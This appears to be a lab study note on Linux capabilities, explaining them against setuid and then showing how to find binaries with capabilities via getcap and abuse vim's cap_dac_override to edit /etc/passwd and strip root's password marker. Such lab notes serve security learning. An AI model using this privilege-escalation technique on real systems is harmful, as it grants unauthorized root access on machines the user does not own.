Capabilities are fine-grained privileges that can be independently enabled or restricted for processes, allowing them to perform specific privileged actions without granting full root access. They help improve security by limiting the power of processes to only what is necessary, reducing the risk of privilege escalation.

While **setuid** grants a process full privileges of the file owner (often root), **capabilities** break down root privileges into smaller, more granular permissions. This means a process can gain only the specific privileges it needs, rather than full root access, reducing security risks.
### Enumeration

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```bash
htb-student@ubuntu:~$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_dac_override+eip
```
### Exploit Example

```bash
cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Remove the `x` from the `passed` file:

```bash
/usr/bin/vim.basic /etc/passwd
```

This is but one example, Google and hacktricks will have more



